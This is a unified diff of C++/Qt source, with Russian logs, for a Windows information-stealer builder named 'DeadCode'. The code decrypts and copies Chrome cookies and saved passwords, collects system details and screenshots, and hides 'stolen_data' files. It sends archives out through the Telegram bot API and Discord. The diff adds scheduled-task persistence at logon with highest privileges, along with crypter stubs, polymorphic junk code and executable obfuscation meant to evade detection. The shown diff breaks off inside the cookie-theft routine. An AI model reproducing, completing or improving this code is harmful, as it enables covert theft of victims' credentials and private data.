+    status = BCryptEncrypt(hKey, reinterpret_cast<PUCHAR>(const_cast<char*>(data.data())), static_cast<ULONG>(data.size()), nullptr,
+                           const_cast<PUCHAR>(iv.data()), static_cast<ULONG>(iv.size()), encryptedData.data(), resultSize, &bytesEncrypted, 0);
     if (!BCRYPT_SUCCESS(status)) {
         emitLog("Ошибка шифрования AES: " + QString::number(status, 16));
         BCryptDestroyKey(hKey);
@@ -690,7 +884,7 @@ QByteArray MainWindow::applyAES(const QByteArray& data, const std::array<unsigne
         return QByteArray();
     }
 
-    result = QByteArray((char*)encryptedData.data(), bytesEncrypted);
+    result = QByteArray(reinterpret_cast<char*>(encryptedData.data()), static_cast<int>(bytesEncrypted));
 
     BCryptDestroyKey(hKey);
     BCryptCloseAlgorithmProvider(hAlg, 0);
@@ -698,6 +892,7 @@ QByteArray MainWindow::applyAES(const QByteArray& data, const std::array<unsigne
     return result;
 }
 
+// Реализация decryptData
 std::string MainWindow::decryptData(const std::string& encryptedData) {
     if (encryptedData.size() < 16) {
         emitLog("Ошибка: Данные слишком малы для дешифрования (нет IV)");
@@ -721,14 +916,14 @@ std::string MainWindow::decryptData(const std::string& encryptedData) {
         return "";
     }
 
-    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
+    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, reinterpret_cast<PUCHAR>(const_cast<wchar_t*>(BCRYPT_CHAIN_MODE_CBC)), sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
     if (!BCRYPT_SUCCESS(status)) {
         emitLog("Ошибка: Не удалось установить режим цепочки для дешифрования: " + QString::number(status, 16));
         BCryptCloseAlgorithmProvider(hAlg, 0);
         return "";
     }
 
-    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)key2.data(), (ULONG)key2.size(), 0);
+    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, const_cast<PUCHAR>(key2.data()), static_cast<ULONG>(key2.size()), 0);
     if (!BCRYPT_SUCCESS(status)) {
         emitLog("Ошибка: Не удалось сгенерировать ключ AES для дешифрования: " + QString::number(status, 16));
         BCryptCloseAlgorithmProvider(hAlg, 0);
@@ -736,11 +931,11 @@ std::string MainWindow::decryptData(const std::string& encryptedData) {
     }
 
     DWORD bytesDecrypted = 0;
-    DWORD resultSize = encryptedByteData.size();
+    DWORD resultSize = static_cast<DWORD>(encryptedByteData.size());
     std::vector<UCHAR> decryptedData(resultSize);
 
-    status = BCryptDecrypt(hKey, (PUCHAR)encryptedByteData.data(), encryptedByteData.size(), nullptr, (PUCHAR)iv.data(), iv.size(),
-                           decryptedData.data(), resultSize, &bytesDecrypted, 0);
+    status = BCryptDecrypt(hKey, reinterpret_cast<PUCHAR>(const_cast<char*>(encryptedByteData.data())), static_cast<ULONG>(encryptedByteData.size()), nullptr,
+                           const_cast<PUCHAR>(iv.data()), static_cast<ULONG>(iv.size()), decryptedData.data(), resultSize, &bytesDecrypted, 0);
     if (!BCRYPT_SUCCESS(status)) {
         emitLog("Ошибка дешифрования AES: " + QString::number(status, 16));
         BCryptDestroyKey(hKey);
@@ -748,7 +943,7 @@ std::string MainWindow::decryptData(const std::string& encryptedData) {
         return "";
     }
 
-    QByteArray xorData((char*)decryptedData.data(), bytesDecrypted);
+    QByteArray xorData(reinterpret_cast<char*>(decryptedData.data()), static_cast<int>(bytesDecrypted));
     QByteArray decryptedByteData = applyXOR(xorData, key1);
 
     BCryptDestroyKey(hKey);
@@ -757,6 +952,7 @@ std::string MainWindow::decryptData(const std::string& encryptedData) {
     return std::string(decryptedByteData.constData(), decryptedByteData.size());
 }
 
+// Реализация generateEncryptionKeys
 void MainWindow::generateEncryptionKeys() {
     emitLog("Генерация ключей шифрования...");
 
@@ -765,7 +961,7 @@ void MainWindow::generateEncryptionKeys() {
     std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()";
     std::random_device rd;
     std::mt19937 gen(rd());
-    std::uniform_int_distribution<> dis(0, chars.size() - 1);
+    std::uniform_int_distribution<> dis(0, static_cast<int>(chars.size()) - 1);
 
     encryptionKey1.clear();
     for (int i = 0; i < keyLength; ++i) {
@@ -787,6 +983,7 @@ void MainWindow::generateEncryptionKeys() {
             ", salt=" + QString::fromStdString(encryptionSalt));
 }
 
+// Реализация obfuscateExecutable
 void MainWindow::obfuscateExecutable(const std::string& exePath) {
     emitLog("Обфускация исполняемого файла: " + QString::fromStdString(exePath));
 
@@ -814,7 +1011,10 @@ void MainWindow::obfuscateExecutable(const std::string& exePath) {
     std::uniform_int_distribution<> dis(1024, 4096);
     int junkSize = dis(gen);
     std::vector<char> junkData(junkSize);
-    RAND_bytes((unsigned char*)junkData.data(), junkSize);
+    if (RAND_bytes(reinterpret_cast<unsigned char*>(junkData.data()), junkSize) != 1) {
+        emitLog("Ошибка: Не удалось сгенерировать мусорные данные для обфускации");
+        return;
+    }
 
     std::string obfPath = exePath + ".obf";
     std::ofstream outFile(obfPath, std::ios::binary);
@@ -824,13 +1024,18 @@ void MainWindow::obfuscateExecutable(const std::string& exePath) {
     }
 
     outFile.write(exeData.data(), exeData.size());
-    outFile.write(junkData.data(), junkData.size());
+    outFile.write(junkData.data(), junkSize);
     outFile.close();
 
-    std::filesystem::rename(obfPath, exePath);
-    emitLog("Исполняемый файл успешно обфусцирован: " + QString::fromStdString(exePath));
+    try {
+        std::filesystem::rename(obfPath, exePath);
+        emitLog("Исполняемый файл успешно обфусцирован: " + QString::fromStdString(exePath));
+    } catch (const std::exception& e) {
+        emitLog("Ошибка переименования обфусцированного файла: " + QString::fromStdString(e.what()));
+    }
 }
 
+// Реализация applyPolymorphicObfuscation
 void MainWindow::applyPolymorphicObfuscation(const std::string& exePath) {
     emitLog("Применение полиморфной обфускации к исполняемому файлу: " + QString::fromStdString(exePath));
 
@@ -872,7 +1077,7 @@ void MainWindow::applyPolymorphicObfuscation(const std::string& exePath) {
     int outLen = 0;
     int totalLen = 0;
 
-    if (EVP_EncryptUpdate(ctx, encryptedData.data(), &outLen, (unsigned char*)exeData.data(), exeData.size()) != 1) {
+    if (EVP_EncryptUpdate(ctx, encryptedData.data(), &outLen, reinterpret_cast<unsigned char*>(exeData.data()), static_cast<int>(exeData.size())) != 1) {
         emitLog("Ошибка: Не удалось выполнить шифрование для полиморфной обфускации");
         EVP_CIPHER_CTX_free(ctx);
         return;
@@ -895,14 +1100,19 @@ void MainWindow::applyPolymorphicObfuscation(const std::string& exePath) {
         return;
     }
 
-    outFile.write((char*)iv, sizeof(iv));
-    outFile.write((char*)encryptedData.data(), totalLen);
+    outFile.write(reinterpret_cast<char*>(iv), sizeof(iv));
+    outFile.write(reinterpret_cast<char*>(encryptedData.data()), totalLen);
     outFile.close();
 
-    std::filesystem::rename(polyPath, exePath);
-    emitLog("Полиморфная обфускация успешно применена: " + QString::fromStdString(exePath));
+    try {
+        std::filesystem::rename(polyPath, exePath);
+        emitLog("Полиморфная обфускация успешно применена: " + QString::fromStdString(exePath));
+    } catch (const std::exception& e) {
+        emitLog("Ошибка переименования файла после полиморфной обфускации: " + QString::fromStdString(e.what()));
+    }
 }
 
+// Реализация generatePolymorphicCode
 std::string MainWindow::generatePolymorphicCode() {
     emitLog("Генерация полиморфного кода...");
 
@@ -970,7 +1180,7 @@ std::string MainWindow::generatePolymorphicCode() {
         polyFile << "    inline void " << funcName << "() {\n";
         polyFile << "        volatile int dummy_" << dis(gen) << "_" << dis(gen) << " = getRandomNumber(1000, 15000);\n";
         polyFile << "        std::string noise = generateRandomString(getRandomNumber(5, 20));\n";
-        polyFile << "        volatile int dummy2_" << dis(gen) << "_" << dis(gen) << " = dummy_" << dis(gen) << "_" << dis(gen) << " ^ noise.length();\n";
+        polyFile << "        volatile int dummy2_" << dis(gen) << "_" << dis(gen) << " = dummy_" << dis(gen) << "_" << dis(gen) << " ^ static_cast<int>(noise.length());\n";
         polyFile << "        for (int i = 0; i < getRandomNumber(3, 15); i++) {\n";
         polyFile << "            if (dummy2_" << dis(gen) << "_" << dis(gen) << " % 2 == 0) {\n";
         polyFile << "                dummy2_" << dis(gen) << "_" << dis(gen) << " = (dummy2_" << dis(gen) << "_" << dis(gen) << " << getRandomNumber(1, 3)) ^ noise[i % noise.length()];\n";
@@ -1002,6 +1212,7 @@ std::string MainWindow::generatePolymorphicCode() {
     return polyCode.str();
 }
 
+// Реализация generateBuildKeyHeader
 void MainWindow::generateBuildKeyHeader(const std::string& encryptionKey) {
     emitLog("Генерация заголовочного файла ключей...");
 
@@ -1059,22 +1270,19 @@ void MainWindow::generateBuildKeyHeader(const std::string& encryptionKey) {
     keyFile << "        key[i] = static_cast<unsigned char>(combined[i % combined.length()]);\n";
     keyFile << "    }\n";
     keyFile << "    std::stringstream ss;\n";
-    keyFile << "    for (const auto& byte : key) {\n";
+    keyFile << "    for (auto byte : key) {\n";
     keyFile << "        ss << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(byte);\n";
     keyFile << "    }\n";
     keyFile << "    return ss.str();\n";
     keyFile << "}\n\n";
 
-    keyFile << "inline std::string GetBuildEncryptionKey() {\n";
-    keyFile << "    return BUILD_ENCRYPTION_KEY;\n";
-    keyFile << "}\n\n";
-
     keyFile << "#endif // BUILD_KEY_H\n";
 
     keyFile.close();
-    emitLog("Ключи шифрования сгенерированы в build_key.h");
+    emitLog("Заголовочный файл ключей сгенерирован: build_key.h");
 }
 
+// Реализация generateJunkCode
 std::string MainWindow::generateJunkCode() {
     emitLog("Генерация мусорного кода...");
 
@@ -1149,6 +1357,7 @@ std::string MainWindow::generateJunkCode() {
     return junkCode.str();
 }
 
+// Реализация generateRandomKey
 std::string MainWindow::generateRandomKey(size_t length) {
     const char charset[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
     std::string key;
@@ -1165,6 +1374,7 @@ std::string MainWindow::generateRandomKey(size_t length) {
     return key;
 }
 
+// Реализация generateStubCode
 std::string MainWindow::generateStubCode(const std::string& key) {
     emitLog("Генерация кода загрузчика (stub)...");
 
@@ -1180,29 +1390,31 @@ std::string MainWindow::generateStubCode(const std::string& key) {
     stub << "}\n\n";
     stub << "int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\n";
     stub << "    char exePath[MAX_PATH];\n";
-    stub << "    GetModuleFileNameA(NULL, exePath, MAX_PATH);\n";
+    stub << "    if (!GetModuleFileNameA(NULL, exePath, MAX_PATH)) return 1;\n";
     stub << "    HANDLE hFile = CreateFileA(exePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\n";
     stub << "    if (hFile == INVALID_HANDLE_VALUE) return 1;\n";
     stub << "    DWORD fileSize = GetFileSize(hFile, NULL);\n";
+    stub << "    if (fileSize == INVALID_FILE_SIZE) { CloseHandle(hFile); return 1; }\n";
     stub << "    std::vector<char> fileData(fileSize);\n";
     stub << "    DWORD bytesRead;\n";
-    stub << "    ReadFile(hFile, fileData.data(), fileSize, &bytesRead, NULL);\n";
+    stub << "    if (!ReadFile(hFile, fileData.data(), fileSize, &bytesRead, NULL) || bytesRead != fileSize) { CloseHandle(hFile); return 1; }\n";
     stub << "    CloseHandle(hFile);\n";
     stub << "    size_t stubSize = 4096;\n";
+    stub << "    if (fileSize <= stubSize) return 1;\n";
     stub << "    std::vector<char> encryptedData(fileData.begin() + stubSize, fileData.end());\n";
     stub << "    decryptData(encryptedData, ENCRYPTION_KEY);\n";
     stub << "    char tempPath[MAX_PATH];\n";
-    stub << "    GetTempPathA(MAX_PATH, tempPath);\n";
+    stub << "    if (!GetTempPathA(MAX_PATH, tempPath)) return 1;\n";
     stub << "    std::string tempFilePath = std::string(tempPath) + \"temp_build.exe\";\n";
     stub << "    HANDLE hTempFile = CreateFileA(tempFilePath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n";
     stub << "    if (hTempFile == INVALID_HANDLE_VALUE) return 1;\n";
     stub << "    DWORD bytesWritten;\n";
-    stub << "    WriteFile(hTempFile, encryptedData.data(), encryptedData.size(), &bytesWritten, NULL);\n";
+    stub << "    if (!WriteFile(hTempFile, encryptedData.data(), encryptedData.size(), &bytesWritten, NULL) || bytesWritten != encryptedData.size()) { CloseHandle(hTempFile); return 1; }\n";
     stub << "    CloseHandle(hTempFile);\n";
     stub << "    STARTUPINFOA si = { sizeof(si) };\n";
     stub << "    PROCESS_INFORMATION pi;\n";
     stub << "    if (CreateProcessA(tempFilePath.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {\n";
-    stub << "        WaitForSingleObject(pi.hProcess, INFINITE);\n";
+    stub << "    WaitForSingleObject(pi.hProcess, INFINITE);\n";
     stub << "        CloseHandle(pi.hProcess);\n";
     stub << "        CloseHandle(pi.hThread);\n";
     stub << "    }\n";
@@ -1222,12 +1434,15 @@ std::string MainWindow::generateStubCode(const std::string& key) {
     std::string compileCommand = "g++ stub.cpp -o " + stubExePath + " -mwindows";
     if (system(compileCommand.c_str()) != 0) {
         emitLog("Ошибка: Не удалось скомпилировать stub");
+        std::filesystem::remove("stub.cpp");
         return "";
     }
 
     std::ifstream stubExeFile(stubExePath, std::ios::binary);
     if (!stubExeFile.is_open()) {
         emitLog("Ошибка: Не удалось открыть скомпилированный stub");
+        std::filesystem::remove("stub.cpp");
+        std::filesystem::remove(stubExePath);
         return "";
     }
     std::vector<char> stubData((std::istreambuf_iterator<char>(stubExeFile)), std::istreambuf_iterator<char>());
@@ -1240,6 +1455,7 @@ std::string MainWindow::generateStubCode(const std::string& key) {
     return std::string(stubData.begin(), stubData.end());
 }
 
+// Реализация encryptBuild
 bool MainWindow::encryptBuild(const std::string& buildPath, const std::string& key) {
     emitLog("Шифрование билда: " + QString::fromStdString(buildPath));
 
@@ -1274,13 +1490,18 @@ bool MainWindow::encryptBuild(const std::string& buildPath, const std::string& k
     outFile.write(encryptedData.data(), encryptedData.size());
     outFile.close();
 
-    std::filesystem::remove(buildPath);
-    std::filesystem::rename(encryptedBuildPath, buildPath);
-
-    emitLog("Билд успешно зашифрован");
-    return true;
+    try {
+        std::filesystem::remove(buildPath);
+        std::filesystem::rename(encryptedBuildPath, buildPath);
+        emitLog("Билд успешно зашифрован");
+        return true;
+    } catch (const std::exception& e) {
+        emitLog("Ошибка при шифровании билда: " + QString::fromStdString(e.what()));
+        return false;
+    }
 }
 
+// Реализация compileBuild
 bool MainWindow::compileBuild(const std::string& polymorphicCode, const std::string& junkCode) {
     emitLog("Компиляция билда...");
 
@@ -1309,7 +1530,7 @@ bool MainWindow::compileBuild(const std::string& polymorphicCode, const std::str
     sourceFile << sourceCode;
     sourceFile.close();
 
-    std::string buildPath = "builds/" + config.filename;
+    std::string buildPath = "builds/" + (config.filename.empty() ? "DeadCode.exe" : config.filename);
     std::string compileCommand = "g++ \"" + sourcePath + "\" -o \"" + buildPath + "\" -mwindows -lbcrypt -lshlwapi -liphlpapi -lpsapi -luser32 -lwininet -ladvapi32 -lws2_32 -lcrypt32 -lzip -lsqlite3 -lcurl -lssl -lcrypto";
     if (!config.iconPath.empty()) {
         compileCommand += " -I. -L. -I./include -L./lib \"" + config.iconPath + "\"";
@@ -1319,13 +1540,16 @@ bool MainWindow::compileBuild(const std::string& polymorphicCode, const std::str
 
     if (system(compileCommand.c_str()) != 0) {
         emitLog("Ошибка компиляции билда");
+        std::filesystem::remove(sourcePath);
         return false;
     }
 
+    std::filesystem::remove(sourcePath);
     emitLog("Билд успешно скомпилирован: " + QString::fromStdString(buildPath));
     return true;
 }
 
+// Реализация archiveData
 std::string MainWindow::archiveData(const std::string& dir, const std::vector<std::string>& files) {
     emitLog("Создание ZIP-архива в директории: " + QString::fromStdString(dir));
 
@@ -1372,6 +1596,7 @@ std::string MainWindow::archiveData(const std::string& dir, const std::vector<st
 
     if (zip_close(zip) < 0) {
         emitLog("Ошибка закрытия ZIP-архива: " + QString::fromStdString(zip_error_strerror(zip_get_error(zip))));
+        zip_discard(zip);
         return "";
     }
 
@@ -1379,6 +1604,7 @@ std::string MainWindow::archiveData(const std::string& dir, const std::vector<st
     return zipPath;
 }
 
+// Реализация encryptData
 std::string MainWindow::encryptData(const std::string& data) {
     emitLog(decryptString(encryptedLogMessage, 0) + "Шифрование данных...");
 
@@ -1390,7 +1616,7 @@ std::string MainWindow::encryptData(const std::string& data) {
     std::array<unsigned char, 16> key2 = GetEncryptionKey(false);
     std::array<unsigned char, 16> iv = generateIV();
 
-    QByteArray dataByteArray(data.c_str(), data.size());
+    QByteArray dataByteArray(data.c_str(), static_cast<int>(data.size()));
     QByteArray xorData = applyXOR(dataByteArray, key1);
 
     QByteArray aesData = applyAES(xorData, key2, iv);
@@ -1407,6 +1633,7 @@ std::string MainWindow::encryptData(const std::string& data) {
     return result;
 }
 
+// Реализация sendToTelegram
 void MainWindow::sendToTelegram(const std::string& data, const std::vector<std::string>& files) {
     emitLog("Отправка данных через Telegram...");
 
@@ -1416,7 +1643,6 @@ void MainWindow::sendToTelegram(const std::string& data, const std::vector<std::
     }
 
     std::string tempDir = "temp_" + generateRandomString(8);
-    std::string zipPath = tempDir + "\\telegram_data.zip";
     std::filesystem::create_directories(tempDir);
 
     std::string createdZipPath = archiveData(tempDir, files);
@@ -1434,7 +1660,6 @@ void MainWindow::sendToTelegram(const std::string& data, const std::vector<std::
         return;
     }
 
-    std::string url = "https://api.telegram.org/bot" + config.telegramBotToken + "/sendDocument";
     CURL* curl = curl_easy_init();
     if (!curl) {
         emitLog("Ошибка: Не удалось инициализировать CURL для Telegram");
@@ -1454,6 +1679,7 @@ void MainWindow::sendToTelegram(const std::string& data, const std::vector<std::
     curl_mime_filedata(part, createdZipPath.c_str());
 
     std::string response;
+    std::string url = "https://api.telegram.org/bot" + config.telegramBotToken + "/sendDocument";
     curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
     curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
     curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
@@ -1482,7 +1708,7 @@ void MainWindow::sendToTelegram(const std::string& data, const std::vector<std::
     }
 }
 
-// Отправка данных через Discord
+// Реализация sendToDiscord
 void MainWindow::sendToDiscord(const std::string& data, const std::vector<std::string>& files) {
     emitLog("Отправка данных через Discord...");
 
@@ -1492,7 +1718,6 @@ void MainWindow::sendToDiscord(const std::string& data, const std::vector<std::s
     }
 
     std::string tempDir = "temp_" + generateRandomString(8);
-    std::string zipPath = tempDir + "\\discord_data.zip";
     std::filesystem::create_directories(tempDir);
 
     std::string createdZipPath = archiveData(tempDir, files);
@@ -1541,10 +1766,16 @@ void MainWindow::sendToDiscord(const std::string& data, const std::vector<std::s
 
     curl_mime_free(mime);
     curl_easy_cleanup(curl);
-    std::filesystem::remove_all(tempDir);
+
+    try {
+        std::filesystem::remove_all(tempDir);
+        emitLog("Временная директория удалена: " + QString::fromStdString(tempDir));
+    } catch (const std::exception& e) {
+        emitLog("Ошибка при удалении временной директории: " + QString::fromStdString(e.what()));
+    }
 }
 
-// Сохранение данных локально
+// Реализация saveToLocalFile
 void MainWindow::saveToLocalFile(const std::string& data, const std::string& dir) {
     emitLog("Сохранение данных локально в директории: " + QString::fromStdString(dir));
 
@@ -1553,17 +1784,21 @@ void MainWindow::saveToLocalFile(const std::string& data, const std::string& dir
 
     std::string destPath = outputDir + "\\stolen_data_" + generateRandomString(8) + ".bin";
     std::ofstream outFile(destPath, std::ios::binary);
-    if (!outFile.is_open()) {
+    if (outFile.is_open()) {
+        outFile.write(data.data(), data.size());
+        outFile.close();
+        // Устанавливаем атрибут скрытого файла
+        if (SetFileAttributesA(destPath.c_str(), FILE_ATTRIBUTE_HIDDEN)) {
+            emitLog("Данные успешно сохранены и скрыты: " + QString::fromStdString(destPath));
+        } else {
+            emitLog("Ошибка установки атрибута скрытия для файла: " + QString::number(GetLastError()));
+        }
+    } else {
         emitLog("Ошибка: Не удалось сохранить данные локально: " + QString::fromStdString(destPath));
-        return;
     }
-
-    outFile.write(data.data(), data.size());
-    outFile.close();
-    emitLog("Данные успешно сохранены локально: " + QString::fromStdString(destPath));
 }
 
-// Отправка данных
+// Реализация sendData
 void MainWindow::sendData(const QString& encryptedData, const std::vector<std::string>& files) {
     std::string data = encryptedData.toStdString();
     if (config.sendMethod == "Telegram") {
@@ -1575,7 +1810,29 @@ void MainWindow::sendData(const QString& encryptedData, const std::vector<std::s
     }
 }
 
-// Сбор системной информации
+// Реализация setupPersistence (новое)
+void MainWindow::setupPersistence() {
+    if (!config.persist) return;
+
+    emitLog("Настройка персистентности через планировщик задач...");
+
+    char exePath[MAX_PATH];
+    if (!GetModuleFileNameA(NULL, exePath, MAX_PATH)) {
+        emitLog("Ошибка: Не удалось получить путь к исполняемому файлу");
+        return;
+    }
+
+    std::string taskName = "DeadCodePersistence_" + generateRandomString(4);
+    std::string command = "schtasks /create /tn \"" + taskName + "\" /tr \"" + std::string(exePath) + "\" /sc onlogon /rl highest /f";
+
+    if (system(command.c_str()) == 0) {
+        emitLog("Задача успешно создана в планировщике задач: " + QString::fromStdString(taskName));
+    } else {
+        emitLog("Ошибка создания задачи в планировщике задач");
+    }
+}
+
+// Реализация collectSystemInfo
 std::string MainWindow::collectSystemInfo(const std::string& dir) {
     emitLog("Сбор системной информации...");
 
@@ -1598,7 +1855,7 @@ std::string MainWindow::collectSystemInfo(const std::string& dir) {
     if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
         char cpuName[1024];
         DWORD size = sizeof(cpuName);
-        if (RegQueryValueExA(hKey, "ProcessorNameString", nullptr, nullptr, (LPBYTE)cpuName, &size) == ERROR_SUCCESS) {
+        if (RegQueryValueExA(hKey, "ProcessorNameString", nullptr, nullptr, reinterpret_cast<LPBYTE>(cpuName), &size) == ERROR_SUCCESS) {
             outFile << "CPU: " << cpuName << "\n";
         }
         RegCloseKey(hKey);
@@ -1613,14 +1870,14 @@ std::string MainWindow::collectSystemInfo(const std::string& dir) {
 
     ULONG bufferSize = 15000;
     std::vector<char> buffer(bufferSize);
-    PIP_ADAPTER_INFO adapterInfo = (PIP_ADAPTER_INFO)buffer.data();
+    PIP_ADAPTER_INFO adapterInfo = reinterpret_cast<PIP_ADAPTER_INFO>(buffer.data());
     if (GetAdaptersInfo(adapterInfo, &bufferSize) == NO_ERROR) {
         for (PIP_ADAPTER_INFO adapter = adapterInfo; adapter; adapter = adapter->Next) {
             outFile << "Network Adapter: " << adapter->Description << "\n";
             outFile << "MAC Address: ";
-            for (int i = 0; i < (int)adapter->AddressLength; ++i) {
-                outFile << std::hex << std::setw(2) << std::setfill('0') << (int)adapter->Address[i];
-                if (i < (int)adapter->AddressLength - 1) outFile << "-";
+            for (int i = 0; i < static_cast<int>(adapter->AddressLength); ++i) {
+                outFile << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(adapter->Address[i]);
+                if (i < static_cast<int>(adapter->AddressLength) - 1) outFile << "-";
             }
             outFile << "\nIP Address: " << adapter->IpAddressList.IpAddress.String << "\n\n";
         }
@@ -1628,10 +1885,11 @@ std::string MainWindow::collectSystemInfo(const std::string& dir) {
 
     outFile.close();
     emitLog("Системная информация сохранена: " + QString::fromStdString(sysInfoPath));
+    collectedFiles.push_back(sysInfoPath);
     return sysInfoPath;
 }
 
-// Создание скриншота
+// Реализация TakeScreenshot
 std::string MainWindow::TakeScreenshot(const std::string& dir) {
     emitLog("Создание скриншота...");
 
@@ -1672,9 +1930,9 @@ std::string MainWindow::TakeScreenshot(const std::string& dir) {
     return screenshotPath;
 }
 
-// Кража данных браузера (только Chrome)
+// Реализация stealBrowserData (старая версия, оставлена для совместимости)
 std::string MainWindow::stealBrowserData(const std::string& dir) {
-    emitLog("Начало кражи данных браузера...");
+    emitLog("Начало кражи данных браузера (старая версия, используйте новую реализацию)...");
 
     std::string browserDir = dir + "\\BrowserData";
     std::filesystem::create_directories(browserDir);
@@ -1691,89 +1949,140 @@ std::string MainWindow::stealBrowserData(const std::string& dir) {
     free(localAppDataPath);
 
     std::string chromePath = localAppData + "\\Google\\Chrome\\User Data\\Default";
-    if (std::filesystem::exists(chromePath)) {
-        emitLog("Обнаружен Google Chrome, начинаем кражу данных...");
-
-        if (config.cookies) {
-            std::string cookiesPath = chromePath + "\\Network\\Cookies";
-            if (std::filesystem::exists(cookiesPath)) {
-                std::string destCookiesPath = browserDir + "\\chrome_cookies.sqlite";
-                std::filesystem::copy_file(cookiesPath, destCookiesPath, std::filesystem::copy_options::overwrite_existing);
-                emitLog("Файл куки Chrome скопирован: " + QString::fromStdString(destCookiesPath));
-
-                sqlite3* db;
-                if (sqlite3_open(destCookiesPath.c_str(), &db) == SQLITE_OK) {
-                    std::string cookiesDataPath = browserDir + "\\chrome_cookies.txt";
-                    std::ofstream cookiesFile(cookiesDataPath);
-                    if (cookiesFile.is_open()) {
-                        sqlite3_stmt* stmt;
-                        const char* query = "SELECT host_key, name, encrypted_value FROM cookies";
-                        if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) == SQLITE_OK) {
-                            while (sqlite3_step(stmt) == SQLITE_ROW) {
-                                std::string host = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
-                                std::string name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
-                                QByteArray encryptedValue((const char*)sqlite3_column_blob(stmt, 2), sqlite3_column_bytes(stmt, 2));
-                                QByteArray decryptedValue = decryptDPAPIData(encryptedValue);
-                                if (!decryptedValue.isEmpty()) {
-                                    cookiesFile << "Host: " << host << "\nName: " << name << "\nValue: " << decryptedValue.toStdString() << "\n\n";
-                                }
-                            }
-                            sqlite3_finalize(stmt);
-                        }
-                        cookiesFile.close();
-                        emitLog("Куки Chrome извлечены: " + QString::fromStdString(cookiesDataPath));
-                        collectedFiles.push_back(cookiesDataPath);
-                        result += "Chrome Cookies: " + cookiesDataPath + "\n";
-                    }
-                    sqlite3_close(db);
-                }
-            }
-        }
-
-        if (config.passwords) {
-            std::string passwordsPath = chromePath + "\\Login Data";
-            if (std::filesystem::exists(passwordsPath)) {
-                std::string destPasswordsPath = browserDir + "\\chrome_logins.sqlite";
-                std::filesystem::copy_file(passwordsPath, destPasswordsPath, std::filesystem::copy_options::overwrite_existing);
-                emitLog("Файл паролей Chrome скопирован: " + QString::fromStdString(destPasswordsPath));
-
-                sqlite3* db;
-                if (sqlite3_open(destPasswordsPath.c_str(), &db) == SQLITE_OK) {
-                    std::string passwordsDataPath = browserDir + "\\chrome_passwords.txt";
-                    std::ofstream passwordsFile(passwordsDataPath);
-                    if (passwordsFile.is_open()) {
-                        sqlite3_stmt* stmt;
-                        const char* query = "SELECT origin_url, username_value, password_value FROM logins";
-                        if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) == SQLITE_OK) {
-                            while (sqlite3_step(stmt) == SQLITE_ROW) {
-                                std::string url = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
-                                std::string username = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
-                                QByteArray encryptedPassword((const char*)sqlite3_column_blob(stmt, 2), sqlite3_column_bytes(stmt, 2));
-                                QByteArray decryptedPassword = decryptDPAPIData(encryptedPassword);
-                                if (!decryptedPassword.isEmpty()) {
-                                    passwordsFile << "URL: " << url << "\nUsername: " << username << "\nPassword: " << decryptedPassword.toStdString() << "\n\n";
-                                }
-                            }
-                            sqlite3_finalize(stmt);
-                        }
-                        passwordsFile.close();
-                        emitLog("Пароли Chrome извлечены: " + QString::fromStdString(passwordsDataPath));
-                        collectedFiles.push_back(passwordsDataPath);
-                        result += "Chrome Passwords: " + passwordsDataPath + "\n";
-                    }
-                    sqlite3_close(db);
-                }
-            }
-        }
-    } else {
+    if (!std::filesystem::exists(chromePath)) {
         emitLog("Google Chrome не найден");
+        return "";
     }
 
-    emitLog("Кража данных браузера завершена");
+    emitLog("Обнаружен Google Chrome, начинаем кражу данных...");
+
+    if (config.cookies) {
+        std::string cookiesPath = chromePath + "\\Network\\Cookies";
+        if (std::filesystem::exists(cookiesPath)) {
+            std::string destCookiesPath = browserDir + "\\chrome_cookies.sqlite";
+            std::filesystem::copy_file(cookiesPath, destCookiesPath, std::filesystem::copy_options::overwrite_existing);
+            emitLog("Файл куки Chrome скопирован: " + QString::fromStdString(destCookiesPath));
+
+            sqlite3* db;
+            if (sqlite3_open(destCookiesPath.c_str(), &db) == SQLITE_OK) {
+                std::string cookiesDataPath = browserDir + "\\chrome_cookies.txt";
+                std::ofstream cookiesFile(cookiesDataPath);
+                if (cookiesFile.is_open()) {
+                    sqlite3_stmt* stmt;
+                    const char* query = "SELECT host_key, name, encrypted_value FROM cookies";
+                    if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) == SQLITE_OK) {
+                        while (sqlite3_step(stmt) == SQLITE_ROW) {
+                            std::string host = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
+                            std::string name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
+                            QByteArray encryptedValue(reinterpret_cast<const char*>(sqlite3_column_blob(stmt, 2)), sqlite3_column_bytes(stmt, 2));
+                            QByteArray decryptedValue = decryptDPAPIData(encryptedValue);
+                            if (!decryptedValue.isEmpty()) {
